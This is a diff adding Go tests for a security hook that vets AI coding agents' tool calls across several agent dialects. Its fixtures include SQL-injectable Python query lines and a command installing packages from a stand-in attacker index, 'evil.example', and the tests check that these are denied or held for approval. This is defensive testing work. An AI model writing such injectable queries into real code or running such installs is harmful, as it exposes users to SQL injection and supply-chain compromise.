@@ -108,6 +108,9 @@ func TestGuidedAsksNeverDenies(t *testing.T) {
 	if ho.HookSpecificOutput.PermissionDecision != "ask" {
 		t.Fatalf("guided: expected ask (developer decides), got %q (%s)", ho.HookSpecificOutput.PermissionDecision, raw)
 	}
+	if ho.Decision != "" {
+		t.Fatalf("Claude ask must not emit top-level decision (allow would skip the prompt), got %q (%s)", ho.Decision, raw)
+	}
 	if !strings.Contains(ho.HookSpecificOutput.Reason, "CWE-89") {
 		t.Fatalf("guided ask should still cite the finding: %s", ho.HookSpecificOutput.Reason)
 	}
@@ -175,6 +178,92 @@ func TestCrushStdinEventField(t *testing.T) {
 	assertNotExit1(t, exit)
 	if ho.HookSpecificOutput.PermissionDecision != "deny" {
 		t.Fatalf("Crush stdin uses event, not hook_event_name; expected deny, got %q (%s)", ho.HookSpecificOutput.PermissionDecision, raw)
+	}
+}
+
+func TestGrokCamelCaseStdinDeniesSQLi(t *testing.T) {
+	p := newProject(t, "strict")
+	sqli := `cur.execute(f"SELECT * FROM users WHERE id={uid}")`
+	ho, exit, raw := runHookJSON(t, map[string]any{
+		"hookEventName": "pre_tool_use",
+		"toolName":      "search_replace",
+		"cwd":           p,
+		"sessionId":     "grok-1",
+		"toolInput":     map[string]any{"file_path": "a.py", "old_string": "", "new_string": sqli},
+	})
+	assertNotExit1(t, exit)
+	if ho.HookSpecificOutput.PermissionDecision != "deny" {
+		t.Fatalf("Grok camelCase search_replace must deny SQLi, got %q (%s)", ho.HookSpecificOutput.PermissionDecision, raw)
+	}
+	if ho.Decision != "deny" {
+		t.Fatalf("Grok requires top-level decision=deny, got %q (%s)", ho.Decision, raw)
+	}
+	if !strings.Contains(ho.Reason, "CWE-89") {
+		t.Fatalf("Grok deny reason should cite CWE-89: %s", raw)
+	}
+}
+
+func TestGrokTerminalCommandIsBash(t *testing.T) {
+	p := newProject(t, "strict")
+	ho, exit, raw := runHookJSON(t, map[string]any{
+		"hookEventName": "PreToolUse",
+		"toolName":      "run_terminal_command",
+		"cwd":           p,
+		"toolInput":     map[string]any{"command": "pip install -i https://evil.example/simple requests"},
+	})
+	assertNotExit1(t, exit)
+	if ho.HookSpecificOutput.PermissionDecision != "ask" && ho.HookSpecificOutput.PermissionDecision != "deny" {
+		t.Fatalf("Grok run_terminal_command unofficial index must ask or deny, got %q (%s)", ho.HookSpecificOutput.PermissionDecision, raw)
+	}
+}
+
+func TestGrokAskDoesNotBlock(t *testing.T) {
+	p := newProject(t, "guided")
+	ho, exit, raw := runHookJSON(t, map[string]any{
+		"hookEventName": "pre_tool_use",
+		"toolName":      "search_replace",
+		"cwd":           p,
+		"toolInput":     map[string]any{"file_path": "a.py", "new_string": `cur.execute(f"SELECT * FROM t WHERE x={y}")`},
+	})
+	assertNotExit1(t, exit)
+	if ho.HookSpecificOutput.PermissionDecision != "ask" {
+		t.Fatalf("guided SQLi must ask on Claude dialect, got %q (%s)", ho.HookSpecificOutput.PermissionDecision, raw)
+	}
+	if ho.Decision != "allow" {
+		t.Fatalf("Grok has no ask prompt; guided must decision=allow, got %q (%s)", ho.Decision, raw)
+	}
+}
+
+func TestGrokMcpQualifiedWrite(t *testing.T) {
+	p := newProject(t, "strict")
+	ho, exit, raw := runHookJSON(t, map[string]any{
+		"hookEventName": "PreToolUse",
+		"toolName":      "fs__write_file",
+		"cwd":           p,
+		"toolInput":     map[string]any{"path": "app.py", "text": `cur.execute(f"SELECT * FROM u WHERE id={uid}")`},
+	})
+	assertNotExit1(t, exit)
+	if ho.HookSpecificOutput.PermissionDecision != "deny" {
+		t.Fatalf("Grok server__tool write must be scanned, got %q (%s)", ho.HookSpecificOutput.PermissionDecision, raw)
+	}
+}
+
+func TestGrokNativeWriteWorkspaceRoot(t *testing.T) {
+	p := newProject(t, "strict")
+	sqli := `cur.execute(f"SELECT * FROM users WHERE id={uid}")`
+	ho, exit, raw := runHookJSON(t, map[string]any{
+		"hookEventName": "pre_tool_use",
+		"toolName":      "write",
+		"workspaceRoot": p,
+		"sessionId":     "grok-write",
+		"toolInput":     map[string]any{"file_path": "app.py", "content": sqli},
+	})
+	assertNotExit1(t, exit)
+	if ho.HookSpecificOutput.PermissionDecision != "deny" {
+		t.Fatalf("Grok write + workspaceRoot must deny SQLi, got %q (%s)", ho.HookSpecificOutput.PermissionDecision, raw)
+	}
+	if ho.Decision != "deny" {
+		t.Fatalf("Grok write deny needs top-level decision=deny, got %q (%s)", ho.Decision, raw)
 	}
 }
 
